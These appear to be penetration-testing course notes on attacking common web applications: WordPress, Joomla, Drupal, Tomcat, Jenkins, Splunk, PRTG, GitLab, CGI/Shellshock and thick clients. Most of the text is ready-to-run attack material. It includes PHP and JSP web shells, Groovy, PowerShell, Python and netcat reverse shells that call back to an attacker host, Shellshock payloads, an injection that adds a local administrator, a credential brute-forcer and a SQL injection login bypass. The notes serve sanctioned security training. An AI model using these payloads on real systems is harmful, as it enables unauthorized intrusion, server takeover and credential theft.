# Attacking Common Applications

## Introduction to Attacking Common Applications

Web applications are common across assessments and often vulnerable to OWASP Top 10 issues or abuse of built-in functionality for RCE.

### Module Targets

Vhosts map to different directories on the same host, so `/etc/hosts` must be edited to reach them by FQDN.

```bash
IP=<TARGET_IP>
printf "%s\t%s\n\n" "$IP" "<TARGET_DOMAIN>" | sudo tee -a /etc/hosts
```

## Application Discovery & Enumeration

Initial web discovery and screenshotting of large scopes to prioritize targets before deep enumeration.

### Nmap - Web Discovery

```bash
nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list # common web ports across scope
nmap --open -sV <TARGET_IP> # service/version scan, default top 1000 ports
```

### Using EyeWitness

Takes Nmap/Nessus XML, screenshots web apps, categorizes and fingerprints them, suggests default creds.

```bash
sudo apt install eyewitness
eyewitness --web -x web_discovery.xml -d <OUTPUT_FILE>
```

### Using Aquatone

Takes Nmap/Masscan XML, screenshots web apps and clusters similar pages into an HTML report.

```bash
wget https://github.com/michenriksen/aquatone/releases/download/v1.7.0/aquatone_linux_amd64_1.7.0.zip
unzip aquatone_linux_amd64_1.7.0.zip
cat web_discovery.xml | ./aquatone -nmap
```

### Interpreting the Results

Tomcat found in results: try default creds on `/manager` and `/host-manager`, upload a malicious WAR for RCE via JSP.

## WordPress - Discovery & Enumeration

Open-source PHP CMS, usually Apache + MySQL backend. Highly extensible via themes/plugins, which are the main vuln source.

### Discovery/Footprinting

`/robots.txt` referencing `/wp-admin` and `/wp-content` indicates WordPress. `/wp-admin` redirects to `/wp-login.php` (login page). Plugins live in `wp-content/plugins`, themes in `wp-content/themes`.

`Administrator` full control incl. editing code | `Editor` publish/manage all posts | `Author` publish/manage own posts | `Contributor` write/manage own posts, can't publish | `Subscriber` browse posts, edit own profile

### Enumeration

```bash
curl -s http://<TARGET_DOMAIN> | grep WordPress # confirm WP + version via generator meta tag
curl -s http://<TARGET_DOMAIN>/ | grep themes # identify theme
curl -s http://<TARGET_DOMAIN>/ | grep plugins # identify plugins
```

Plugin/theme directories often have directory listing enabled with a `readme.txt` revealing the version.

#### Enumerating Users

`/wp-login.php` with a valid username and wrong password returns "password is incorrect"; an invalid username returns "not registered". Confirms valid usernames.

#### WPScan

Automated WordPress scanner for outdated/vulnerable themes, plugins, users. Installed by default on Parrot OS.

```bash
sudo gem install wpscan
sudo wpscan --url http://<TARGET_DOMAIN> --enumerate --api-token <TOKEN> # default enumerates vulnerable plugins/themes/users/media/backups
```

`--enumerate ap` all plugins | `-t` thread count, default 5 | `--api-token` WPVulnDB token for vuln data

XML-RPC enabled at `/xmlrpc.php` can be used for password brute-forcing.

## Attacking WordPress

Abuse built-in functionality (theme editor) or known plugin vulnerabilities after obtaining admin or plugin-level access.

### Login Bruteforce

WPScan brute forces via `xmlrpc` (faster, via API) or `wp-login` (standard login page).

```bash
sudo wpscan --password-attack xmlrpc -t 20 -U <USERNAME> -P rockyou.txt --url http://<TARGET_DOMAIN>
```

`--password-attack` xmlrpc or wp-login | `-U` user/userlist | `-P` password list | `-t` threads

### Code Execution

Admin access lets PHP source be edited via Appearance > Theme Editor. Edit an inactive theme to avoid corrupting the live site.

```php
system($_GET[0]);
```

```bash
curl http://<TARGET_DOMAIN>/wp-content/themes/<THEME>/404.php?0=id
```

Metasploit `exploit/unix/webapp/wp_admin_shell_upload` uploads a malicious plugin and runs a PHP Meterpreter shell.

```bash
msf6 > use exploit/unix/webapp/wp_admin_shell_upload
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set username <USERNAME>
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set password <PASSWORD>
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set lhost <ATTACKER_IP>
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhost <TARGET_IP>
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set VHOST <TARGET_DOMAIN>
msf6 exploit(unix/webapp/wp_admin_shell_upload) > exploit
```

Must set both VHOST and RHOSTS or the module fails with "target does not appear to be using WordPress".

Report appendix should list:

- Exploited systems (hostname/IP, method of exploitation)
- Compromised users (account name, method of compromise, account type)
- Artifacts created on systems
- Changes made (e.g. new admin user, group membership)

### Leveraging Known Vulnerabilities

`waybackurls` can reveal old/forgotten plugins via the Wayback Machine that may still be accessible and vulnerable even if unlinked.

#### Vulnerable Plugins - mail-masta

Unauthenticated LFI via the `pl` GET parameter (no input validation), plus SQL injection.

```bash
curl -s http://<TARGET_DOMAIN>/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```

#### Vulnerable Plugins - wpDiscuz

CVE-2020-24186: file mime-type bypass allows unauthenticated PHP file upload for RCE (v7.0.4).

```bash
python3 wp_discuz.py -u http://<TARGET_DOMAIN> -p /?p=1
```

`-u` target URL | `-p` path to a valid post

If the exploit doesn't return command output directly, append `?cmd=` to the uploaded `.php` shell path and use cURL to run commands.

## Joomla - Discovery & Enumeration

Open-source PHP CMS, usually MySQL (or PostgreSQL/SQLite) backend. Extensible via extensions/templates.

### Discovery/Footprinting

```bash
curl -s http://<TARGET_DOMAIN>/ | grep Joomla # generator meta tag
curl -s http://<TARGET_DOMAIN>/README.txt | head -n 5 # version info
curl -s http://<TARGET_DOMAIN>/administrator/manifests/files/joomla.xml | xmllint --format - # version info
```

`robots.txt` disallowing `/administrator/`, `/components/`, `/modules/` etc. indicates Joomla. Version can also be approximated via `plugins/system/cache/cache.xml`.

### Enumeration

Admin login at `/administrator/index.php`. Default user `admin`, password set at install time.

```bash
sudo pip3 install droopescan
droopescan scan joomla --url http://<TARGET_DOMAIN>/
```

JoomlaScan (Python2, needs `bs4`) finds accessible components/directories and helps fingerprint extensions.

```bash
python2 -m pip install bs4
python2 joomlascan.py -u http://<TARGET_DOMAIN>
```

```bash
sudo python3 joomla-brute.py -u http://<TARGET_DOMAIN> -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```

## Attacking Joomla

Gain RCE via admin-authenticated template editing, similar to WordPress theme editing.

Gotcha: "Call to a member function format() on null" error after login, disable the "Quick Icon - PHP Version Check" plugin via `/administrator/index.php?option=com_plugins`.

### Abusing Built-In Functionality

Configuration > Templates > select a template > Customise > edit an uncommon page (e.g. `error.php`), add a PHP one-liner using a non-obvious parameter name.

```php
system($_GET['<PARAM>']);
```

```bash
curl -s http://<TARGET_DOMAIN>/templates/<TEMPLATE>/error.php?<PARAM>=id
```

### Leveraging Known Vulnerabilities

CVE-2019-10945: directory traversal and authenticated arbitrary file deletion, Joomla 1.5.0–3.9.4. Only useful for reading files if admin creds are known but the admin panel isn't reachable; with panel access, template RCE is faster.

```bash
python2.7 joomla_dir_trav.py --url "http://<TARGET_DOMAIN>/administrator/" --username <USERNAME> --password <PASSWORD> --dir /
```

## Drupal - Discovery & Enumeration

Open-source PHP CMS, MySQL/PostgreSQL/SQLite backend. Extensible via modules/themes.

### Discovery/Footprinting

```bash
curl -s http://<TARGET_DOMAIN> | grep Drupal # "Powered by Drupal" / generator meta tag
curl -s http://<TARGET_DOMAIN>/CHANGELOG.txt | grep -m2 "" # version, first 2 lines
```

Content is indexed via nodes (`/node/<ID>`), a good Drupal indicator with custom themes. Newer installs block `CHANGELOG.txt`/`README.txt` by default.

`Administrator` full control | `Authenticated User` can add/edit per permissions | `Anonymous` read-only by default

### Enumeration

```bash
droopescan scan drupal -u http://<TARGET_DOMAIN>
```

## Attacking Drupal

Drupal blocks direct theme/plugin PHP edits by default. RCE needs the PHP filter module, a backdoored module upload, or a core CVE.

### Leveraging the PHP Filter Module

Pre-v8: admin enables the PHP filter module, then Content > Add content > Basic page, sets Text format to "PHP code".

```php
<?php
system($_GET['<PARAM>']);
?>
```

```bash
curl -s http://<TARGET_DOMAIN>/node/<NODE_ID>?<PARAM>=id | grep uid | cut -f4 -d">"
```

v8+: module not installed by default, must be downloaded and installed manually (confirm with the client first, since this modifies their instance).

```bash
wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
```

Install via Administration > Reports > Available updates (or Extend menu) > install from uploaded archive, then create a Basic page as above.

### Uploading a Backdoored Module

Drupal denies direct access to `/modules`. A `.htaccess` re-enables access for the uploaded module folder.

```php
<?php
system($_GET['<PARAM>']);
?>
```

```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```

```bash
wget --no-check-certificate https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
```

Install via Extend > Install new module > browse to the archive > Install, then:

```bash
curl -s <TARGET_DOMAIN>/modules/captcha/shell.php?<PARAM>=id
```

### Leveraging Known Vulnerabilities

Three "Drupalgeddon" core RCE/SQLi flaws:

`CVE-2014-3704` Drupalgeddon, pre-auth SQLi, 7.0–7.31, fixed 7.32, creates an admin user or uploads malicious code | `CVE-2018-7600` Drupalgeddon2, RCE, <7.58 and <8.5.1, insufficient sanitization during user registration | `CVE-2018-7602` Drupalgeddon3, authenticated RCE via Form API, needs node-delete permission

#### Drupalgeddon

```bash
python2.7 drupalgeddon.py -t http://<TARGET_DOMAIN> -u <USERNAME> -p <PASSWORD> # creates new admin user
```

Can also use Metasploit `exploit/multi/http/drupal_drupageddon`.

#### Drupalgeddon2

```bash
python3 drupalgeddon2.py # interactive, prompts for target URL, writes a test file to confirm
```

Modify the script's `echo` to write a PHP payload instead of the test file.

```php
<?php system($_GET[<PARAM>]);?>
```

```bash
echo '<?php system($_GET[<PARAM>]);?>' | base64
echo "<BASE64_PAYLOAD>" | base64 -d | tee <FILE>.php # replace the script's echo command with this
curl http://<TARGET_DOMAIN>/<FILE>.php?<PARAM>=id
```

#### Drupalgeddon3

Authenticated RCE via Form API, requires a valid session cookie and node-delete permission.

```bash
msf6 exploit(multi/http/drupal_drupageddon3) > set rhosts <TARGET_IP>
msf6 exploit(multi/http/drupal_drupageddon3) > set VHOST <TARGET_DOMAIN>
msf6 exploit(multi/http/drupal_drupageddon3) > set drupal_session <SESSION_COOKIE>
msf6 exploit(multi/http/drupal_drupageddon3) > set DRUPAL_NODE <NODE_ID>
msf6 exploit(multi/http/drupal_drupageddon3) > set LHOST <ATTACKER_IP>
msf6 exploit(multi/http/drupal_drupageddon3) > exploit
```

## Tomcat - Discovery & Enumeration

Open-source Java servlet/JSP web server. Common default creds and manager app access lead to RCE.

### Discovery/Footprinting

Server header or an invalid-page 404 response leaks version. `/docs` default docs page also leaks the version if custom error pages are used.

```bash
curl -s http://<TARGET_DOMAIN>:<PORT>/docs/ | grep Tomcat
```

Key paths: `conf/tomcat-users.xml` (manager creds/roles), `webapps/` (webroot, one folder per app), `WEB-INF/web.xml` (deployment descriptor, maps URL routes to servlet classes, may leak data via LFI), `WEB-INF/classes` (compiled classes, may hold business logic/secrets), `WEB-INF/lib` (app libraries).

`manager-gui` HTML GUI + status pages | `manager-script` HTTP API + status pages | `manager-jmx` JMX proxy + status pages | `manager-status` status pages only

### Enumeration

```bash
gobuster dir -u http://<TARGET_DOMAIN>:<PORT>/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt # find /manager, /host-manager
```

Weak/default creds on `/manager` or `/host-manager` (e.g. `tomcat:tomcat`, `admin:admin`) allow uploading a WAR file containing a JSP web shell for RCE.

## Attacking Tomcat

Brute force manager credentials, then upload a WAR web shell for RCE. Also check for Ghostcat (CVE-2020-1938).

### Tomcat Manager - Login Brute Force

```bash
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set VHOST <TARGET_DOMAIN>
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RPORT <PORT>
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set stop_on_success true
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts <TARGET_IP>
msf6 auxiliary(scanner/http/tomcat_mgr_login) > run
```

Default wordlists: `tomcat_mgr_default_pass.txt`, `tomcat_mgr_default_users.txt`, `tomcat_mgr_default_userpass.txt`. Debug via Burp with `set PROXIES HTTP:127.0.0.1:8080`.

```bash
echo <BASE64> | base64 -d # decode captured Basic Auth header to verify creds tried
```

Python brute force alternative:

```python
#!/usr/bin/python

import requests
from termcolor import cprint
import argparse

parser = argparse.ArgumentParser(description = "Tomcat manager or host-manager credential bruteforcing")

parser.add_argument("-U", "--url", type = str, required = True, help = "URL to tomcat page")
parser.add_argument("-P", "--path", type = str, required = True, help = "manager or host-manager URI")
parser.add_argument("-u", "--usernames", type = str, required = True, help = "Users File")
parser.add_argument("-p", "--passwords", type = str, required = True, help = "Passwords Files")

args = parser.parse_args()

url = args.url
uri = args.path
users_file = args.usernames
passwords_file = args.passwords

new_url = url + uri
f_users = open(users_file, "rb")
f_pass = open(passwords_file, "rb")
usernames = [x.strip() for x in f_users]
passwords = [x.strip() for x in f_pass]

cprint("\n[+] Atacking.....", "red", attrs = ['bold'])

for u in usernames:
    for p in passwords:
        r = requests.get(new_url,auth = (u, p))

        if r.status_code == 200:
            cprint("\n[+] Success!!", "green", attrs = ['bold'])
            cprint("[+] Username : {}\n[+] Password : {}".format(u,p), "green", attrs = ['bold'])
            break
    if r.status_code == 200:
        break

if r.status_code != 200:
    cprint("\n[+] Failed!!", "red", attrs = ['bold'])
    cprint("[+] Could not Find the creds :( ", "red", attrs = ['bold'])
```

```bash
python3 mgr_brute.py -U http://<TARGET_DOMAIN>:<PORT>/ -P /manager -u tomcat_mgr_default_users.txt -p tomcat_mgr_default_pass.txt
```

### Tomcat Manager - WAR File Upload

`/manager/html` (default) lets `manager-gui` users deploy WAR files for instant RCE.

```java
<%@ page import="java.util.*,java.io.*"%>
<%
//
// JSP_KIT
//
// cmd.jsp = Command Execution (unix)
//
// by: Unknown
// modified: 27/06/2003
//
%>
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "<BR>");
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
                out.println(disr); 
                disr = dis.readLine(); 
                }
        }
%>
</pre>
</BODY></HTML>
```

```bash
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r backup.war cmd.jsp
```

Deploy via manager GUI (Browse > Deploy). Browse to `/<APP>/cmd.jsp` after (the app root alone 404s).

```bash
curl http://<TARGET_DOMAIN>:<PORT>/backup/cmd.jsp?cmd=id
```

Undeploy via manager GUI to remove the WAR and its extracted directory (default webroot e.g. `/opt/tomcat/apache-tomcat-<VERSION>/webapps`).

msfvenom WAR payload (auto-extracted and runs on deploy):

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f war > backup.war
nc -lnvp <PORT>
```

Metasploit `multi/http/tomcat_mgr_upload` automates WAR upload. Changing a web shell's internal strings (e.g. mixed-casing "Uploaded:") can reduce AV detection.

### A Quick Note on Web shells

Use a randomized (e.g. MD5-style) file name, restrict access by source IP, and password-protect uploaded web shells to prevent a "drive-by" attacker from finding and using them.

### CVE-2020-1938 : Ghostcat

Unauthenticated LFI via a misconfigured AJP protocol (port 8009 by default). Affects Tomcat <9.0.31, <8.5.51, <7.0.100. Exploit can only read files under the webapps folder (not e.g. `/etc/passwd`).

```bash
nmap -sV -p 8009,8080 <TARGET_DOMAIN>
python2.7 tomcat-ajp.lfi.py <TARGET_DOMAIN> -p 8009 -f WEB-INF/web.xml
```

`-p` AJP port | `-f` file to read

## Jenkins - Discovery & Enumeration

Open-source Java CI/CD automation server, often run as SYSTEM/root.

### Discovery/Footprinting

Runs on Tomcat, port 8080 by default. Port 5000 used to attach slave servers. Auth can be local DB, LDAP, Unix user DB, delegated to the servlet container, or disabled entirely.

### Enumeration

Login page fingerprint at `/login?from=%2F`. Weak/default creds (`admin:admin`) or no authentication at all are common, even occasionally on external assessments.

## Attacking Jenkins

Script console gives RCE via Groovy. Jenkins often runs as root/SYSTEM.

### Script Console

At `/script`. Runs Groovy (compiles to Java bytecode).

```groovy
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```

Reverse shell (Linux, via /dev/tcp):

```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<ATTACKER_IP>/<PORT>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

Windows command execution:

```groovy
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");
```

Java reverse shell for Windows (swap host/port):

```groovy
String host="<ATTACKER_IP>";
int port=<PORT>;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

### Miscellaneous Vulnerabilities

CVE-2018-1999002 + CVE-2019-1003000 combined bypass the script-security sandbox for pre-auth RCE (works against 2.137), abusing dynamic routing to bypass the Overall/Read ACL and downloading/executing a malicious JAR.

A separate flaw in 2.150.2 allows RCE via Node.js for users with JOB creation + BUILD privileges. Anonymous users get these by default if enabled.

## Splunk - Discovery & Enumeration

Log analytics tool often used for security monitoring, frequently runs as root/SYSTEM. `CVE-2018-11409` info disclosure, `CVE-2011-4642` authenticated RCE (old versions).

### Discovery/Footprinting

Web UI on port 8000 by default, management/REST API on port 8089.

```bash
sudo nmap -sV <TARGET_IP> # identifies Splunkd httpd on 8000/8089
```

Older versions show default creds `admin:changeme` on the login page. Newer versions set creds at install. Also try common weak passwords (`Welcome1`, `Password123`, etc.).

### Enumeration

A forgotten Enterprise Trial auto-converts to the Free license after 60 days, which has no authentication at all.

RCE is commonly achieved via a scripted input (Bash, PowerShell, Batch, or Python, every Splunk install bundles Python) run through a malicious custom app.

## Attacking Splunk

Custom app upload running a scripted input gives RCE in the context of the Splunk service account (often root/SYSTEM).

### Abusing Built-In Functionality

Custom app directory structure:

```text
splunk_shell/
├── bin
└── default
```

`bin/` holds the script to run, `default/inputs.conf` tells Splunk which script to run and how often.

```powershell
$client = New-Object System.Net.Sockets.TCPClient('<ATTACKER_IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

```text
[script://./bin/rev.py]
disabled = 0
interval = 10
sourcetype = shell

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```

```cmd
@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
Exit
```

```bash
tar -cvzf updater.tar.gz splunk_shell/
```

Start a listener, then upload the tarball via Manage Apps > Install app from file, the app enables automatically and the shell fires on upload.

```bash
sudo nc -lnvp <PORT>
```

Linux target reverse shell script (`rev.py`):

```python
import sys,socket,os,pty

ip="<ATTACKER_IP>"
port="<PORT>"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```

If the compromised host is a deployment server, placing the app in `$SPLUNK_HOME/etc/deployment-apps` pushes it (and RCE) to all Universal Forwarders. Windows UFs don't ship Python, use the PowerShell version there.

## PRTG Network Monitor

Agentless Delphi-based network monitor. Default creds and an authenticated command injection are the main footholds.

### Discovery/Footprinting/Enumeration

Common on ports 80, 443, 8080 (web interface port is configurable by an admin). Default creds `prtgadmin:prtgadmin`, often pre-filled on the login page.

```bash
curl -s http://<TARGET_IP>:<PORT>/index.htm -A "Mozilla/5.0 (compatible;  MSIE 7.01; Windows NT 5.0)" | grep version
```

### Leveraging Known Vulnerabilities

`CVE-2018-9276`: authenticated command injection in the System Administrator web console, affects PRTG <18.2.39. The Parameter field of a notification is passed unsanitized into a PowerShell script.

Setup > Account Settings > Notifications > Add new notification > tick EXECUTE PROGRAM > select an existing `.ps1` (e.g. `Demo exe notification - outfile.ps1`) > inject a command in the Parameter field.

```text
test.txt;net user <USERNAME> <PASSWORD> /add;net localgroup administrators <USERNAME> /add
```

Save, then click Test to trigger (blind, no output returned).

```bash
sudo crackmapexec smb <TARGET_IP> -u <USERNAME> -p <PASSWORD> # confirm local admin access
```

## osTicket

Open-source PHP/MySQL support ticketing system. Rarely vulnerable itself, but useful for OSINT and company email acquisition.

### Footprinting/Discovery/Enumeration

Cookie `OSTSESSID` set on page visit. Footer often shows "powered by" osTicket / "Support Ticket System". `CVE-2020-24881`: SSRF in osTicket 1.14.1.

### Attacking osTicket

Submitting a new ticket can yield a valid company email address (e.g. `<TICKET_ID>@<TARGET_DOMAIN>`), usable to register on other externally exposed services requiring email verification (Slack, Mattermost, GitLab, Bitbucket, etc.).

```bash
sudo python3 dehashed.py -q <TARGET_DOMAIN> -p # search breach data for a domain
```

`-q` query | `-p` search parameter

Agent ticket queues can leak cleartext passwords (e.g. standard new-joiner passwords reused across accounts) and an address book exportable for password spraying.

## Gitlab - Discovery & Enumeration

Self-hosted Git repo manager (Go/Ruby on Rails/Vue.js). Public/internal/private repos may leak secrets even without valid creds. Two-factor authentication is disabled by default.

### Footprinting & Discovery

Login page at `/users/sign_in` shows the GitLab logo. Version is only visible via `/help` when logged in (register first if self-registration is open).

### Enumeration

`/explore` lists public projects/groups/snippets, check for hardcoded credentials, API keys, SSH keys.

`/users/sign_up` can enumerate valid users/emails even if sign-up is disabled: an existing username returns "Username is already taken", an existing email returns "Email has already been taken".

Registering an account (where allowed) may expose additional internal projects not visible unauthenticated.

## Attacking GitLab

Username enumeration plus an authenticated ExifTool RCE are the key abuse paths.

### Username Enumeration

Not treated as a vulnerability by GitLab, but still useful for password spraying.

```bash
./gitlab_userenum.sh --url http://<TARGET_DOMAIN>:<PORT>/ --userlist <WORDLIST>
```

Default lockout: 10 failed attempts, 10-minute unlock (configurable via admin UI from v16.6+, `max_login_attempts` / `failed_login_attempts_unlock_period_in_minutes`).

```text
config.maximum_attempts = 10
config.unlock_in = 10.minutes
```

### Authenticated Remote Code Execution

GitLab CE ≤13.10.2: authenticated RCE via ExifTool mishandling metadata in uploaded images.

```bash
python3 gitlab_13_10_2_rce.py -t http://<TARGET_DOMAIN>:<PORT> -u <USERNAME> -p <PASSWORD> -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <ATTACKER_IP> <ATTACKER_PORT> >/tmp/f '
```

## Attacking Tomcat CGI

`CVE-2019-0232`: Windows CGI Servlet command injection when `enableCmdLineArguments` is enabled. Affects Tomcat 9.0.0.M1–9.0.17, 8.5.0–8.5.39, 7.0.0–7.0.93.

### Enumeration

```bash
nmap -p- -sC -Pn <TARGET_IP> --open
```

### Finding a CGI script

Default CGI directory is `/cgi`, fuzz for script extensions.

```bash
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://<TARGET_IP>:<PORT>/cgi/FUZZ.cmd
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://<TARGET_IP>:<PORT>/cgi/FUZZ.bat
```

### Exploitation

Command injection via the `&` batch separator after a discovered CGI script.

```http
http://<TARGET_IP>:<PORT>/cgi/<SCRIPT>.bat?&dir
```

List environment variables (`PATH` is unset, so later commands need a hardcoded path):

```http
http://<TARGET_IP>:<PORT>/cgi/<SCRIPT>.bat?&set
```

A patched filter blocks special characters like `:` and `\`, bypass by URL-encoding the payload.

```http
http://<TARGET_IP>:<PORT>/cgi/<SCRIPT>.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
```

## Attacking Common Gateway Interface (CGI) Applications - Shellshock

`CVE-2014-6271` ("Bash bug"): vulnerable Bash (<4.3) executes commands placed after a function definition stored in an environment variable. Still found in the wild, especially on IoT/embedded devices using CGI. Patched Bash requires env function definitions to be prefixed `BASH_FUNC_`, breaking this technique.

```bash
env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable" # local test
```

### Enumeration

```bash
gobuster dir -u http://<TARGET_IP>/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
```

### Exploitation

Payload delivered via the `User-Agent` header (or any header/field Bash processes as an env var).

```bash
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://<TARGET_IP>/cgi-bin/<SCRIPT>.cgi
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1' http://<TARGET_IP>/cgi-bin/<SCRIPT>.cgi
```

## Attacking Thick Client Applications

Locally installed apps (Java, C++, .NET, Silverlight) that do more processing client-side. Web-specific attacks (XSS/CSRF/Clickjacking) don't apply, but many other classes do.

Two-tier: app talks directly to the database. Three-tier: app talks to an application server (HTTP/HTTPS), which talks to the database. More secure since the attacker can't reach the DB directly, but the app server tier can still be vulnerable to SQLi/path traversal.

### Penetration Testing Steps

#### Information Gathering

Identify architecture, languages/frameworks, entry points and user inputs.

`CFF Explorer` `Detect It Easy` `Process Monitor` `Strings`

#### Client Side attacks

Static analysis (reverse-engineer EXE/DLL/JAR/CLASS/WAR for hardcoded creds) and dynamic analysis (inspect memory for secrets).

`Ghidra` `IDA` `OllyDbg` `Radare2` `dnSpy` `x64dbg` `JADX` `Frida`

Common issue classes: improper error handling, hardcoded sensitive data, DLL hijacking, buffer overflow, SQL injection, insecure storage, session management.

#### Network Side Attacks

Traffic analysis can capture sensitive data sent over HTTP/HTTPS or TCP/UDP.

`Wireshark` `tcpdump` `TCPView` `Burp Suite`

#### Server Side Attacks

Similar to standard web application attacks, most of the OWASP Top Ten applies.

### Retrieving Hardcoded Credentials from Thick-Client Applications

Scenario: an executable found on an SMB NETLOGON share drops and immediately deletes temp files.

Deny delete permissions on the target temp folder first (Properties > Security > Advanced > Disable inheritance > Convert inherited permissions to explicit > Edit > deselect Delete / Delete subfolders and files) so dropped files survive, then monitor with Process Monitor (ProcMon64) to catch them.

A dropped batch script may contain a base64 blob plus a PowerShell snippet that reconstructs it to an EXE:

```powershell
[System.IO.File]::WriteAllBytes("<PATH>", [System.Convert]::FromBase64String($salida))
```

To inspect a binary that resolves credentials at runtime, open it in `x64dbg` with Options > Preferences > uncheck all except Exit Breakpoint (starts debugging at the app's exit point, skipping DLL loads). Right-click the CPU view > Follow in Memory Map, look for a `RW` region (possible embedded PE, confirm via `MZ` magic bytes), then Dump Memory to File.

```bash
strings64.exe <DUMPED_FILE>.bin # confirm a .NET executable
```

Deobfuscate with De4Dot (drag the dumped binary onto the de4dot executable), then open the cleaned binary in `dnSpy` to read the decompiled C# source and recover hardcoded credentials.

## Exploiting Web Vulnerabilities in Thick-Client Applications

Three-tier thick clients can still be vulnerable to SQLi and path traversal through the application server tier.

### Editing a Thick Client's Server Config

```cmd
echo <TARGET_IP>    <TARGET_DOMAIN> >> C:\Windows\System32\drivers\etc\hosts
```

Extract a JAR (right-click > Extract files), then search for a hardcoded value across the source.

```powershell
ls <EXTRACTED_DIR>\ -recurse | Select-String "<PORT>" | Select Path, LineNumber | Format-List
```

Spring config files (`beans.xml`) may hold the server host/port and shared secrets in `<constructor-arg>`/`<property>` elements.

Signed JARs verify each file's SHA-256 hash listed in `META-INF/MANIFEST.MF` before running. To patch and re-run: edit the config, strip the `Name:`/`SHA-256-Digest:` entries from `MANIFEST.MF` (leave only the header, ending in a blank line), and delete the `.RSA`/`.SF` signature files from `META-INF`.

```bash
jar -cmf .\META-INF\MANIFEST.MF ..\<OUTPUT_FILE>.jar *
```

### Path Traversal

If the server filters the `/` character from a file-browsing parameter, decompile the client (JD-GUI, Save All Sources) to find the method sending the folder parameter and the GUI code that hardcodes it, then patch the hardcoded value to `..` (no slash needed) to traverse up.

```bash
javac -cp <JAR> <PATH_TO_GUI_JAVA_FILE>
mkdir raw
cp <JAR> raw\<JAR>-2.jar
jar -cmf META-INF\MANIFEST.MF <OUTPUT_FILE>.jar .
```

Overwrite the extracted copy's recompiled `.class` files with the patched ones before the final `jar` build above.

To exfiltrate a traversed file, patch the client's file-open handler to write the server's response bytes to a local file via `FileOutputStream`.

### SQL Injection

Client-side password hashing (`sha256(username+password+<SECRET>)`) doesn't stop injection in the username field if the server builds the query by string concatenation. A trailing `'` in the username can trigger a SQL syntax error, logged server-side (readable via the path traversal above) to confirm the injection point.

`' or '1'='1` style payloads fail here because the returned row's password hash won't match the client-computed hash, but a `UNION SELECT` can fabricate an entire row, including password and role, so the attacker controls what gets hashed/compared.

```sql
<ANY>' UNION SELECT 1,'<USER>','<EMAIL>','<PASSWORD>','admin
```

If the client hashes the password before sending, patch the client's password-setter to send the plaintext password instead, so it matches the UNION-injected plaintext value server-side, yielding an authenticated login with an arbitrary role (e.g. `admin`).

## ColdFusion - Discovery & Enumeration

Java-based web app platform by Adobe, using the CFML tag-based language (`.cfm`/`.cfc` files, tags like `cfquery`, `cfloop`, `cfdirectory`, `cfexecute`).

